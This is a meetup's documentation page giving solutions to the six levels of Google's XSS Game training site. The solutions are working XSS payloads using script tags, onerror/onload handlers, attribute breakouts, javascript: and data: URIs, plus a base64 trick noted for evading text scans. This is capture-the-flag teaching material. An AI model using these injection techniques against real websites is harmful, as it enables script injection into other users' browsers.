

<!DOCTYPE html>
<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
<head>
  <meta charset="utf-8">
  <meta content="default-src 'none'; script-src 'self' https://cdnjs.cloudflare.com 'unsafe-inline'; connect-src 'self'; img-src 'self'; style-src 'self'; font-src 'self'; form-action 'self'; frame-ancestors 'none'; base-uri 'self'" http-equiv="Content-Security-Policy" />
<meta content="nosniff" http-equiv="X-Content-Type-Options" />
<meta content="deny" http-equiv="X-Frame-Options" />
<meta content="1; mode=block" http-equiv="X-XSS-Protection" />
<meta content="strict-origin" http-equiv="Referrer-Policy" />
<meta content="max-age=31536000; includeSubDomains" http-equiv="Strict-Transport-Security" />
<meta content="'*'" http-equiv="Access-Control-Allow-Origin" />

  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <title>3.22. Google’s XSS Game &mdash; South Bay WASP 1.0.3 documentation</title>
  

  
  
  
  

  

  
  
    

  

  <link rel="stylesheet" href="../_static/css/theme.css" type="text/css" />
  <link rel="stylesheet" href="../_static/pygments.css" type="text/css" />
    <link rel="index" title="Index" href="../genindex.html" />
    <link rel="search" title="Search" href="../search.html" />
    <link rel="next" title="3.23. Owning the Database with SQLMap" href="owning_database_with_sqlmap.html" />
    <link rel="prev" title="3.21. Vulnix" href="vulnix.html" /> 

  
  <script src="../_static/js/modernizr.min.js"></script>

</head>

<body class="wy-body-for-nav">

   
  <div class="wy-grid-for-nav">

    
    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
      <div class="wy-side-scroll">
        <div class="wy-side-nav-search">
          

          
            <a href="../index.html" class="icon icon-home"> South Bay WASP
          

          
          </a>

          
            
            
              <div class="version">
                1.0
              </div>
            
          

          
<div role="search">
  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
    <input type="text" name="q" placeholder="Search docs" />
    <input type="hidden" name="check_keywords" value="yes" />
    <input type="hidden" name="area" value="default" />
  </form>
</div>

          
        </div>

        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
          
            
            
              
            
            
              <p class="caption"><span class="caption-text">Table of Contents</span></p>
<ul class="current">
<li class="toctree-l1"><a class="reference internal" href="../pentest_intro.html">1. South Bay WASP Meetup</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_kali.html">2. Kali Linux</a></li>
<li class="toctree-l1 current"><a class="reference internal" href="../pentest_challenges.html">3. Pentest Challenges</a><ul class="current">
<li class="toctree-l2"><a class="reference internal" href="VWADP.html">3.1. Finding and running challenges</a></li>
<li class="toctree-l2"><a class="reference internal" href="moinmoin.html">3.2. MoinMoin</a></li>
<li class="toctree-l2"><a class="reference internal" href="owlnest.html">3.3. OwlNest</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice6.html">3.4. De-ICE Level 6</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice5.html">3.5. De-ICE Level 5</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice4.html">3.6. De-ICE Level 4</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice3.html">3.7. De-ICE Level 3</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice2.html">3.8. De-ICE Level 2</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice1.html">3.9. De-ICE Level 1</a></li>
<li class="toctree-l2"><a class="reference internal" href="underdist3.html">3.10. Underdist: 3</a></li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix5.html">3.11. Kioptrix Level 5</a></li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix4.html">3.12. Kioptrix Level 4</a></li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix3.html">3.13. Kioptrix Level 3</a></li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix2.html">3.14. Kioptrix Level 2</a></li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix1.html">3.15. Kioptrix Level 1</a></li>
<li class="toctree-l2"><a class="reference internal" href="security_shepherd.html">3.16. Security Shepherd Web App Levels</a></li>
<li class="toctree-l2"><a class="reference internal" href="holynix2.html">3.17. Holynix2</a></li>
<li class="toctree-l2"><a class="reference internal" href="holynix1.html">3.18. Holynix1</a></li>
<li class="toctree-l2"><a class="reference internal" href="freshly.html">3.19. Freshly</a></li>
<li class="toctree-l2"><a class="reference internal" href="zorz.html">3.20. ZorZ</a></li>
<li class="toctree-l2"><a class="reference internal" href="vulnix.html">3.21. Vulnix</a></li>
<li class="toctree-l2 current"><a class="current reference internal" href="#">3.22. Google’s XSS Game</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#level-1">3.22.1. Level 1</a></li>
<li class="toctree-l3"><a class="reference internal" href="#level-2">3.22.2. Level 2</a></li>
<li class="toctree-l3"><a class="reference internal" href="#level-3">3.22.3. Level 3</a></li>
<li class="toctree-l3"><a class="reference internal" href="#level-4">3.22.4. Level 4</a></li>
<li class="toctree-l3"><a class="reference internal" href="#level-5">3.22.5. Level 5</a></li>
<li class="toctree-l3"><a class="reference internal" href="#level-6">3.22.6. Level 6</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="owning_database_with_sqlmap.html">3.23. Owning the Database with SQLMap</a></li>
<li class="toctree-l2"><a class="reference internal" href="from_sql_injection_to_shell_II.html">3.24. PentesterLab From SQL injection to Shell II</a></li>
<li class="toctree-l2"><a class="reference internal" href="from_sql_injection_to_shell.html">3.25. PentesterLab From SQL injection to Shell</a></li>
<li class="toctree-l2"><a class="reference internal" href="skytower1.html">3.26. SkyTower1</a></li>
<li class="toctree-l2"><a class="reference internal" href="nebula.html">3.27. Exploit Exercises Nebula</a></li>
<li class="toctree-l2"><a class="reference internal" href="natas.html">3.28. Natas</a></li>
<li class="toctree-l2"><a class="reference internal" href="try2hack.nl.html">3.29. try2hack.nl</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_encryption.html">4. Encryption</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_html.html">5. HTML</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_network_tools.html">6. Pentest Network Tools</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_recon.html">7. Pentest Reconnaisance</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_study.html">8. Pentest Study</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_buffer_overflow.html">9. Pentest Buffer Overflow</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_scripting.html">10. Pentest scripting</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_presentations.html">11. Pentest Presentations</a></li>
</ul>

            
          
        </div>
      </div>
    </nav>

    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">

      
      <nav class="wy-nav-top" aria-label="top navigation">
        
          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
          <a href="../index.html">South Bay WASP</a>
        
      </nav>


      <div class="wy-nav-content">
        
        <div class="rst-content">
        
          















<div role="navigation" aria-label="breadcrumbs navigation">

  <ul class="wy-breadcrumbs">
    
      <li><a href="../index.html">Docs</a> &raquo;</li>
        
          <li><a href="../pentest_challenges.html">3. Pentest Challenges</a> &raquo;</li>
        
      <li>3.22. Google’s XSS Game</li>
    
    
      <li class="wy-breadcrumbs-aside">
        
            
            <a href="../_sources/challenges/googles_xss_game.rst.txt" rel="nofollow"> View page source</a>
          
        
      </li>
    
  </ul>

  
  <hr/>
</div>
          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
           <div itemprop="articleBody">
            
  <div class="section" id="google-s-xss-game">
<span id="xssgame"></span><h1>3.22. Google’s XSS Game<a class="headerlink" href="#google-s-xss-game" title="Permalink to this headline">¶</a></h1>
<p>This is to document the meetup’s efforts responding to the challenge <a class="reference external" href="https://xss-game.appspot.com/">XSS game</a>. Try the exercises yourself before getting the answers below.</p>
<p>There is no VM setup required as the exploit is available online via Google App Engine, the same site hosting the content you are currently reading. Both sites are based on using the Python back end, which is why you’ll see some target code in python.</p>
<p>Note that this is one exercise requiring a browser because a client-side javascript <code class="docutils literal notranslate"><span class="pre">alert()</span></code> is required, rendering our usual command line tools (<code class="docutils literal notranslate"><span class="pre">curl</span></code> et. al.) ineffective.</p>
<p>For an introduction to XSS see <a class="reference internal" href="../html/xss.html#xss-tutorial"><span class="std std-ref">XSS Tutorial</span></a>.</p>
<div class="section" id="level-1">
<h2>3.22.1. Level 1<a class="headerlink" href="#level-1" title="Permalink to this headline">¶</a></h2>
<p>Enter <code class="docutils literal notranslate"><span class="pre">&lt;script&gt;alert(&quot;boo&quot;)&lt;/script&gt;</span></code> in the form. Alternatively, you can enter the unescaped url</p>
<blockquote>
<div><code class="docutils literal notranslate"><span class="pre">https://xss-game.appspot.com/level1/frame?query=&lt;script&gt;alert(&quot;boo&quot;)&lt;/script&gt;</span></code></div></blockquote>
<p>or escape the query part of the url by replacing that with</p>
<blockquote>
<div><code class="docutils literal notranslate"><span class="pre">?query=%3Cscript%3Ealert%28%22boo%22%29%3C%2Fscript%3E</span></code>.</div></blockquote>
<p>Any of these will submit an HTTP GET with the returned page having <code class="docutils literal notranslate"><span class="pre">&lt;script&gt;alert(&quot;boo&quot;)&lt;/script&gt;</span></code> in the html body for execution.</p>
<p>Note that the browser will encode the GET for you, but should you want to do that yourself you can use one of the many urlencode web sites or in python:</p>
<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import urllib; </span><span class="se">\</span>
<span class="s1">name = &quot;query&quot;; value = &quot;&lt;script&gt;alert(</span><span class="se">\&quot;</span><span class="s1">boo</span><span class="se">\&quot;</span><span class="s1">)&lt;/script&gt;&quot;;</span>
<span class="k">print</span><span class="p">(</span><span class="n">urllib</span><span class="o">.</span><span class="n">urlencode</span><span class="p">(</span> <span class="p">{</span><span class="n">name</span> <span class="p">:</span> <span class="n">value</span><span class="p">}</span> <span class="p">));</span><span class="s1">&#39;</span>
</pre></div>
</div>
</div>
<div class="section" id="level-2">
<h2>3.22.2. Level 2<a class="headerlink" href="#level-2" title="Permalink to this headline">¶</a></h2>
<p>Enter <code class="docutils literal notranslate"><span class="pre">&lt;img</span> <span class="pre">src=&quot;a</span> <span class="pre">b&quot;</span> <span class="pre">onerror=&quot;alert('boo')&quot;</span> <span class="pre">/&gt;</span></code> in the form (a non-existing image trips <code class="docutils literal notranslate"><span class="pre">onerror</span></code>), or <code class="docutils literal notranslate"><span class="pre">&lt;img</span> <span class="pre">src=&quot;/static/logos/level1.png&quot;</span> <span class="pre">onload=&quot;alert('boo')&quot;</span></code> (an existing image trips <code class="docutils literal notranslate"><span class="pre">onload</span></code>).</p>
<p>This one is quite different: there is one initial HTTP GET request, then clicking <code class="docutils literal notranslate"><span class="pre">Clear</span> <span class="pre">all</span> <span class="pre">posts</span></code> or <code class="docutils literal notranslate"><span class="pre">Share</span> <span class="pre">status!</span></code> is handled on the client side via DOM innerHTML manipulation (no HTTP GET or POST is involved).</p>
<p>You may have tried inserting <code class="docutils literal notranslate"><span class="pre">&lt;script&gt;</span></code> tags like the previous level, but that is doomed to failure in HTML5 compliant browsers. From <a class="reference external" href="https://developer.mozilla.org/en-US/docs/Web/API/Element.innerHTML#Security_considerations">Element.innerHTML - Security considerations</a>:</p>
<blockquote>
<div><p>HTML5 specifies that a &lt;script&gt; tag inserted via innerHTML should not execute.</p>
<p>However, there are ways to execute JavaScript without using &lt;script&gt; elements, so there is still a security risk whenever you use innerHTML to set strings over which you have no control. For example:</p>
<div class="highlight-javascript notranslate"><div class="highlight"><pre><span></span><span class="kd">var</span> <span class="nx">name</span> <span class="o">=</span> <span class="s2">&quot;&lt;img src=x onerror=alert(1)&gt;&quot;</span><span class="p">;</span>
<span class="nx">el</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">name</span><span class="p">;</span> <span class="c1">// shows the alert</span>
</pre></div>
</div>
<p>For that reason, it is recommended you not use innerHTML when inserting plain text; instead, use node.textContent. This doesn’t interpret the passed content as HTML, but instead inserts it as raw text.</p>
</div></blockquote>
<p>Despite what this says, from <a class="reference external" href="https://security.stackexchange.com/questions/60861/why-are-scripts-injected-through-innerhtml-not-executed-whilst-onerror-and-other">Why are scripts injected through innerHTML not executed whilst onerror and other on&lt;event&gt; attributes on elements are? - Google XSS Challenge 2</a>:</p>
<blockquote>
<div><p>Script tags with a defer attribute will not be executed (on some browsers) until the DOM has been fully rendered. For instance, I tried the same challenge on IE and I was able to alert a popup using the following user input:</p>
<div class="highlight-html notranslate"><div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">script</span> <span class="na">defer</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mi">2</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</pre></div>
</div>
</div></blockquote>
</div>
<div class="section" id="level-3">
<h2>3.22.3. Level 3<a class="headerlink" href="#level-3" title="Permalink to this headline">¶</a></h2>
<p>Enter <code class="docutils literal notranslate"><span class="pre">https://xss-game.appspot.com/level3/frame#x'</span> <span class="pre">onerror='alert(&quot;boo&quot;)'</span></code>, or <code class="docutils literal notranslate"><span class="pre">https://xss-game.appspot.com/level3/frame#1.jpg'</span> <span class="pre">onload='alert(&quot;boo&quot;)'</span></code> repeating the idea of the prior level using onerror/onload.</p>
<p>Of course you could use a <code class="docutils literal notranslate"><span class="pre">&lt;script&gt;</span></code> successfully via <code class="docutils literal notranslate"><span class="pre">https://xss-game.appspot.com/level3/frame#1.jpg'</span> <span class="pre">\&gt;</span> <span class="pre">&lt;script&gt;alert(&quot;boo&quot;)&lt;/script&gt;</span> <span class="pre">&lt;div</span></code> since you’re forcing an HTTP GET.</p>
</div>
<div class="section" id="level-4">
<h2>3.22.4. Level 4<a class="headerlink" href="#level-4" title="Permalink to this headline">¶</a></h2>
<p>Enter <code class="docutils literal notranslate"><span class="pre">3');alert('boo</span></code>. You’re just concatenating the alert to the already-existing <code class="docutils literal notranslate"><span class="pre">onload</span></code> javascript in an <code class="docutils literal notranslate"><span class="pre">&lt;img&gt;</span></code> tag.</p>
</div>
<div class="section" id="level-5">
<h2>3.22.5. Level 5<a class="headerlink" href="#level-5" title="Permalink to this headline">¶</a></h2>
<p>Enter <code class="docutils literal notranslate"><span class="pre">https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert(&quot;boo&quot;)</span></code> then click the <code class="docutils literal notranslate"><span class="pre">Next</span> <span class="pre">&gt;&gt;</span></code> link (which is the required alert).</p>
</div>
<div class="section" id="level-6">
<h2>3.22.6. Level 6<a class="headerlink" href="#level-6" title="Permalink to this headline">¶</a></h2>
<p>Enter <code class="docutils literal notranslate"><span class="pre">https://xss-game.appspot.com/level6/frame#data:text/javascript,alert(&quot;boo&quot;)</span></code>. This is an example of using a <a class="reference external" href="https://en.wikipedia.org/wiki/Data_URI_scheme">Data URI scheme</a>:</p>
<blockquote>
<div><code class="docutils literal notranslate"><span class="pre">data:[&lt;MIME-type&gt;][;charset=&lt;encoding&gt;][;base64],&lt;data&gt;</span></code></div></blockquote>
<p>To use base64 encoding change the URIs <code class="docutils literal notranslate"><span class="pre">#data:...</span></code> to:</p>
<blockquote>
<div><code class="docutils literal notranslate"><span class="pre">#data:text/plain;base64,YWxlcnQoImJvbyIp</span></code></div></blockquote>
<p>making it difficult for simple text scans to find the base64-encoded <code class="docutils literal notranslate"><span class="pre">alert(&quot;boo&quot;)</span></code>.</p>
<p>Also see <a class="reference external" href="http://hacktracking.blogspot.com/2014_05_01_archive.html">hacktracking # XSS game area</a> for some additional ideas beyond <code class="docutils literal notranslate"><span class="pre">alert(&quot;boo&quot;)</span></code>.</p>
</div>
</div>


           </div>
           
          </div>
          <footer>
  
    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
      
        <a href="owning_database_with_sqlmap.html" class="btn btn-neutral float-right" title="3.23. Owning the Database with SQLMap" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
      
      
        <a href="vulnix.html" class="btn btn-neutral" title="3.21. Vulnix" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left"></span> Previous</a>
      
    </div>
  

  <hr/>

  <div role="contentinfo">
    <p>
        &copy; Copyright 2017, bitbender.

    </p>
  </div>
  Built with <a href="http://sphinx-doc.org/">Sphinx</a> using a <a href="https://github.com/rtfd/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>. 

</footer>

        </div>
      </div>

    </section>

  </div>
  


  

    <script type="text/javascript">
        var DOCUMENTATION_OPTIONS = {
            URL_ROOT:'../',
            VERSION:'1.0.3',
            LANGUAGE:'None',
            COLLAPSE_INDEX:false,
            FILE_SUFFIX:'.html',
            HAS_SOURCE:  true,
            SOURCELINK_SUFFIX: '.txt'
        };
    </script>
      <script type="text/javascript" src="../_static/jquery.js"></script>
      <script type="text/javascript" src="../_static/underscore.js"></script>
      <script type="text/javascript" src="../_static/doctools.js"></script>
      <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>

  

  <script type="text/javascript" src="../_static/js/theme.js"></script>

  <script type="text/javascript">
      jQuery(function () {
          SphinxRtdTheme.Navigation.enable(true);
      });
  </script> 

</body>
</html>